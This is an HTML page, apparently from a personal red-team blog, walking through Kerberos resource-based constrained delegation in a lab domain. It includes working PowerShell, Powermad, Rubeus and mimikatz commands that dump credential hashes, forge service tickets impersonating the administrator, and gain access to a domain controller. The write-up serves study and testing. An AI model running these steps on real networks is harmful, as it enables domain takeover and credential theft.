@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="SeikoSrp">
+
+
+
+
+
+
+<title>Kerberos_RBCD | a blog</title>
+
+
+
+    <link rel="icon" href="/haidao.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        // console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<!-- Chic/layout.ejs -->
+ <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">SeikoSrp&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                <!-- 这里表示的是pc端搜索框 -->
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">SeikoSrp&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">前往底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部折叠"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Kerberos_RBCD</h1>
+            
+                <div class="post-meta">
+                    
+                        作者: <a itemprop="author" rel="author" href="/">SeikoSrp</a>
+                    
+
+                    
+                        <span class="post-time">
+                        发布于: <a href="#">十二月 18, 2020&nbsp;&nbsp;18:47:41</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    分类:
+                            
+                                <a href="/categories/RedTeam-%E5%9F%9F%E5%AE%89%E5%85%A8/">RedTeam&域安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>基于资源的约束委派（Resource-Based Constrained Delegation）是在Windows Server 2012中新加入的功能。</p>
+<p>此前的委派（约束委派和非约束委派）需要通过SPN来支持，需要将SPN注册到msDS-AllowedToDelegateTo属性中。而基于资源的约束委派是通过msDS-AllowedToActOnBehalfOfOtherIdentity，通过设置运行服务的计算机账户或者是服务账户。RBCD的设置是在被访问的一端来设置。被访问的服务可以自己决定谁有权限来访问自身。</p>
+<h2 id="如何设置RBCD"><a href="#如何设置RBCD" class="headerlink" title="如何设置RBCD"></a>如何设置RBCD</h2><h3 id="RBCD配置"><a href="#RBCD配置" class="headerlink" title="RBCD配置"></a>RBCD配置</h3><p>RBCD的设置可以通过命令来进行设置，修改LDAP中的msDS-AllowedToActOnBehalfOfOtherIdentity参数来进行设置。如果通过Powershell设置的话再设置之前需要安装Active Directory PowerShell模块，然后将该模块导入会话中：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; <span class="built_in">Add-WindowsFeature</span> RSAT<span class="literal">-AD</span><span class="literal">-PowerShell</span></span><br><span class="line">PS C:\&gt; <span class="built_in">Import-Module</span> ActiveDirectory</span><br></pre></td></tr></table></figure>
+
+<p>然后有多个cmdlet可以设置PrincipalsAllowedToDelegateToAccount参数：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; <span class="built_in">Get-Command</span> <span class="literal">-ParameterName</span> PrincipalsAllowedToDelegateToAccount</span><br><span class="line"></span><br><span class="line">CommandType Name                 ModuleName</span><br><span class="line">----------- ----                 ----------</span><br><span class="line">Cmdlet      <span class="built_in">New-ADComputer</span>       ActiveDirectory</span><br><span class="line">Cmdlet      <span class="built_in">New-ADServiceAccount</span> ActiveDirectory</span><br><span class="line">Cmdlet      <span class="built_in">New-ADUser</span>           ActiveDirectory</span><br><span class="line">Cmdlet      <span class="built_in">Set-ADComputer</span>       ActiveDirectory</span><br><span class="line">Cmdlet      <span class="built_in">Set-ADServiceAccount</span> ActiveDirectory</span><br><span class="line">Cmdlet      <span class="built_in">Set-ADUser</span>           ActiveDirectory</span><br></pre></td></tr></table></figure>
+
+<p>如果提示没有这些命令则需要安装Active Directory PowerShell模块。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span>  ServerManager ; <span class="built_in">Add-WindowsFeature</span> RSAT<span class="literal">-AD</span><span class="literal">-PowerShell</span></span><br></pre></td></tr></table></figure>
+
+<p>其中分别对应的是域账户、服务账户、和域中主机。PrincipalsAllowedToDelegateToAccount参数对应的就是LDAP中的参数msDS-AllowedToActOnBehalfOfOtherIdentity。其中包含可指定哪些账户有权限访问自身。也就是需要访问谁，就在谁上面设置中继的账户。</p>
+<p>比如要在DC2012主机上设置将自身的委派凭据委派给testrbcd则可以使用命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADComputer</span> dc2012 <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> testrbcd<span class="variable">$</span></span><br><span class="line"><span class="built_in">Get-ADComputer</span> dc2012 <span class="literal">-Properties</span> PrincipalsAllowedToDelegateToAccount <span class="comment">#查看结果的</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="Kerberos_RBCD.assets/1571989391101.png" alt="1571989391101"></p>
+<h3 id="其他相关配置"><a href="#其他相关配置" class="headerlink" title="其他相关配置"></a>其他相关配置</h3><p>在使用Get-ADComputer(或者是Set-ADComputer等Active Directory PowerShell模块)中设置不同的委派会使用不同的参数。下面几个均为命令中的<strong>参数</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#无约束委派</span><br><span class="line">TrustedForDelegation</span><br><span class="line">#约束委派</span><br><span class="line">TrustedToAuthForDelegation</span><br><span class="line">#基于资源的约束委派</span><br><span class="line">PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+
+<p>而userAccountControl是LDAP中的一个属性(打开ADSI编辑器在对应的属性中即可看到)。</p>
+<p><img src="Kerberos_RBCD.assets/1572170279746.png" alt="1572170279746"></p>
+<h2 id="RBCD的流程"><a href="#RBCD的流程" class="headerlink" title="RBCD的流程"></a>RBCD的流程</h2><p>就像名字所说的，基于资源的约束委派，从流量上来看和约束委派还是差别不大的，首先会经过一个S4u2Self的流程（testrbcd申请能够访问自身的TGS），然后进行S4u2Proxy（申请访问特定SPN的TGS）。</p>
+<p>这里的IP：192.168.16.133为发起攻击的主机，192.168.16.132为域控主机（DC2012）。</p>
+<p><img src="Kerberos_RBCD.assets/1571993548984.png" alt="1571993548984"></p>
+<p>此时发起攻击的主机获取了能够访问DC2012的cifs服务的TGS票据。</p>
+<p><img src="Kerberos_RBCD.assets/1572168610408.png" alt="1572168610408"></p>
+<h2 id="RBCD的利用"><a href="#RBCD的利用" class="headerlink" title="RBCD的利用"></a>RBCD的利用</h2><h3 id="NTLMRelay-RBCD的域内提权"><a href="#NTLMRelay-RBCD的域内提权" class="headerlink" title="NTLMRelay+RBCD的域内提权"></a>NTLMRelay+RBCD的域内提权</h3><p>此前网上是有各种利用方法的，但是最后实际上都是通过修改LDAP，再发起获取TGS的Kerberos请求，所以先说下基本的流程是什么样的。</p>
+<p>1、首先在域控上（有权限配置主机LDAP即可）修改LDAP中的msDS-AllowedToActOnBehalfOfOtherIdentity属性（即通过上文所说命令）。其中dc2012为域控主机，testrbcd为域内其他主机（使用<a href="https://github.com/Kevin-Robertson/Powermad生成的一个虚拟的主机）。" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Powermad生成的一个虚拟的主机）。</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Powermad生成主机命令</span></span><br><span class="line">PS C:\&gt;. .\Powermad.ps1</span><br><span class="line">PS C:\&gt;<span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> testrbcd</span><br><span class="line"><span class="comment">#执行之后会提示输入密码</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADComputer</span> dc2012 <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> testrbcd<span class="variable">$</span></span><br><span class="line"><span class="built_in">Get-ADComputer</span> dc2012 <span class="literal">-Properties</span> PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+
+<p><img src="Kerberos_RBCD.assets/1571993951337.png" alt="1571993951337"></p>
+<p>2、设置完成之后通过Rubues模拟发起请求。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; .\Rubeus.exe s4u /user:testrbcd<span class="variable">$</span> /rc4:<span class="number">8</span>bbe95fcb83756d902da7faccd2fa6e1 /domain:test.local /msds</span><br><span class="line">spn:cifs/dc2012.test.local /impersonateuser:administrator</span><br><span class="line"><span class="comment">#PS C:\&gt;.\Rubeus.exe s4u /user:[刚生成的主机名称] /rc4:[生成的主机密码的NTLM HASH值] /domain:[域名] /msds</span></span><br><span class="line">spn:[<span class="type">SPN</span>] /impersonateuser:administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="Kerberos_RBCD.assets/1571998711998.png" alt="1571998711998"></p>
+<p>首先可以看到请求发起之后提示S4U2Self success！此时testrbcd获取到验证自身的TGS票据。</p>
+<p>随后获取到能够访问cifs/dc2012.test.local这个SPN的TGS票据。</p>
+<p><img src="Kerberos_RBCD.assets/1571998916248.png" alt="1571998916248"></p>
+<p>然后再使用Rubues.exe这个工具就可以把TGS导入到内存中，随后就可以使用dir \\dc2012\c$访问域控的C盘。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;.\Rubeus.exe ptt /ticket:doIGMDCCBiygAwIBBaEDAgEWooIFNjCCBTJhggUuMIIFKqADAgEFoQwbClRFU1QuTE9DQUyiJDAioAMCAQKhGzAZGwRjaWZzGxFkYzIwMTIudGVzdC5sb2NhbKOCBO0wggTpoAMCARKhAwIBBaKCBNsEggTXAxijl5toQzJH7Ndf7GbxnFN0l+H5HKG5HKHi1pgbX8O4wsE+wq4/<span class="number">5</span>wLVol1pgcg8tiRCMjlL8Xt2PMSS+mEnogSxSVLllGFLLuO11LlRXKWmKcftTrgo/YISyivPAZZ7RhBHLSIESi2ZQJw+lxU9SrKWFb3v6u4i2B+/gBfTE4V893EA9+lY/<span class="number">05</span>wWv25YNekuq+E7wPEq/<span class="number">3</span>wkchlQWUqHcSxL+Rm/ZZGYvF/<span class="number">7</span>Ia4wYDuSzTTAfZ30CqKnPuEcTHu3X/QLopYUTL3TqI8z8o74EUVyJ22TB3pCGYur0TUAfRjQmltQPZMBQ0+D8hNlokhSIFmgYTMp4j5f8iJzghFSfDdsi3cjrUPAEHldr4JzaD8HbHOI/<span class="number">8</span>L5yCQUUUURrvhFhMCbt+j6cMEH/kOHRgkULO82x1sAx6NMwAX43SdyA/lkgmvCVKH3NfXoLtN83fgK+b3l0BdD6SImak6ko71lY8ieWnMaenTnKmaxRv/JAz8/Y/AsHRtr+knxPxCZq+z2DVAC3tU4tI/FsX0st2ktCW/kBKFZN9BwH4GZFU3fUDiv1HXYD3Buz5U9oyfyxNfLYolRxLAkxqNF7Ahzabpg3Hlyxr5j5ILyhxvTwd5K/C2cM2yJv/YtqVwwbwGfxnTWUFX05nx4lKDqg1C9jrl0J62qQ6dDHmz65FSjMTA6gcNtfOGDsdOZ8/OiBqD50jF84Gfx5ASVDH1QvaPvnlUnHjTTLpjxyJ1Kk9f1RanrAe/JEXwhfg6Vigzn8mUWNo6av6aGUFfmoRrsNSec7HsTaGStha7DUSusOrJfIcoF59Ff672nhCnuSbcsqdcWBQGDyrxlmLcMW3SOm5vLzVa4sT/ruGfBBxz3ja0ETEU6pBYE2tEv1EPZ7mFRa1D/<span class="number">1</span>Femt6ntVevbEa0mcO6fJ0RVEiyTzPZewhuBGQ0y0o3c6wTdBysiBEGF7BkA8FfKKVoy+rMMpQnnuJbD28OOgV56eAP7NYqT3mWgQ0BGdihXj531IVPwwWcYAyXu0x28tU3L5970BgFpNJYncqCiml4SsbIFC/MIu7En9K9JrsQ3jd+q+<span class="number">5</span>kwJaO0dI756ViS9tOlWP/R7R4NzSkCOlQ2M7P9VVvceGdCXNR3plM+CahntXOEh2RccdVVmgTTVFHsXV+<span class="number">5</span>OTsEb5Q90xUBSA6y2cUBEpJzrMQ7RrawXn9VajE9nDlLzesWMZsNwBVdGIx2sL/V+q5ancUHDFEudcEhqvPgcAV6FXP4HChSHgPGe+Xpl9+Rw2OzXcBd8LQdGaun04YNxB5h+R5syrPBqMWJmHOC0VrQdfCWIYvNxPGhNPkopvsAyW7HfjklBkjVsA27ledbbu4rRlQTtfkTzTNsr1mMS5qqDU3fAQfuV8WpDuKumBJQ29tZV7cX+Dxd0L5yaAOW+n09Bja1FWKnH/Vc1cnnbtQDKZ0exVsUr9AO2Wci93ncBrz2zUaX8e8Mxj1i2xAniWcTFV/tCfdye64GBkrnDmHClYVI/ssO8FfSKIAwBNxC2cFC1dSQf8OCuj/UPZnYup3zRYS/sIYwye5Lzy62+wm1DM1uLSEtXYlJ7/EaZ0IIyDCw8/tnW74itqAy63nEfrtdGIspGrEQxacjCEjQEWWKjFvup4221Vn+<span class="number">4</span>RyfED3EmO1MAqho4HlMIHioAMCAQCigdoEgdd9gdQwgdGggc4wgcswgcigGzAZoAMCARGhEgQQNskus5tLHqeLa9vd/LuMiKEMGwpURVNULkxPQ0FMoiUwI6ADAgEKoRwwGhsYYWRtaW5pc3RyYXRvckBURVNULkxPQ0FMowcDBQBApQAApREYDzIwMTkxMDI0MTcxMTMwWqYRGA8yMDE5MTAyNTAzMTEzMFqnERgPMjAxOTEwMzExNzExMzBaqAwbClRFU1QuTE9DQUypJDAioAMCAQKhGzAZGwRjaWZzGxFkYzIwMTIudGVzdC5sb2NhbA==</span><br></pre></td></tr></table></figure>
+
+<p>实际上在获取了TGS之后，这就是一个PTT（Pass The Ticket）的过程。这个实验是通过手动设置的委派配置，但是个人认为这正是整个攻击过程中最核心的一点，其他通过修改计算机账户头像、SMB请求、Exchange的SSRF等等，最终的目的都是希望通过利用高权限的账户发起NTLM请求，然后中继到LDAP服务器，从而修改委派的配置（LDAP中的msDS-AllowedToActOnBehalfOfOtherIdentity参数）。</p>
+<h3 id="通过反射进行本地提权"><a href="#通过反射进行本地提权" class="headerlink" title="通过反射进行本地提权"></a>通过反射进行本地提权</h3><p>通过设置自身对自身的委派（设置自身属性不需要高权限），然后请求访问自身的高权限TGS。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置自己对自己的委派</span></span><br><span class="line"><span class="built_in">Set-ADComputer</span> win2012 <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> win2012<span class="variable">$</span></span><br><span class="line"><span class="comment">#查看</span></span><br><span class="line"><span class="built_in">Get-ADComputer</span> win2012 <span class="literal">-Properties</span> PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+
+<p>然后开启WINRM服务：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enable-PSRemoting</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
+
+<p>使用Rubeus以域管理员身份访问当前计算机的HTTP服务。注意这里的rc4 hash值不能使用本地账号密码的HASH值，要使用主机账户的HASH值。使用mimikatz抓的：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">"privilege::Debug"</span> <span class="string">"sekurlsa::logonpasswords"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="Kerberos_RBCD.assets/1572226782759.png" alt="1572226782759"></p>
+<p>然后使用Rubeus通过委派获取票据。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /user:win2012<span class="variable">$</span> /rc4:c2b57f3b6e6ed5eee4b6f8866b814ac5 /domain:test.local /msdsspn:http/win2012.test.local /impersonateuser:administrator</span><br><span class="line"><span class="comment">#导入ticket票据</span></span><br><span class="line">.\Rubeus.exe ptt /ticket:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>
+
+<p>通过New-PSSession创建新的会话，然后通过Enter-PSSession开启会话。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-PSSession -Name priv -ComputerName win2012.test.local</span><br><span class="line">Enter-PSSession -Name priv</span><br></pre></td></tr></table></figure>
+
+<p>再执行whoami可以看到账户已经改变。</p>
+<p><img src="Kerberos_RBCD.assets/1572227998459.png" alt="1572227998459"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/12-18-Kerberos%E5%8D%8F%E8%AE%AE%E6%8E%A2%E7%B4%A2%E7%B3%BB%E5%88%97%E4%B8%80%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%88%86%E7%A0%B4%E7%AF%87/">Kerberos协议探索系列一扫描与爆破篇</a>
+            
+            
+            <a class="next" rel="next" href="/2020/12-18-Hostapd+DNSMASQ%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9/">Hostapd+DNSMASQ创建钓鱼热点</a>
+            
+        </section>
+	
+		<section id="comments" class="comments">
+		  <style>
+			.comments{margin:30px;padding:10px;background:#fff}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+		  </style>
+		  <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'ehQ0k7G3fcpwmkyxhG8U6DzL-gzGzoHsz',
+      app_key: 'AwwXGgbdqswiimAY0qJYhtRa',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+		</section>
+	
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© SeikoSrp | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
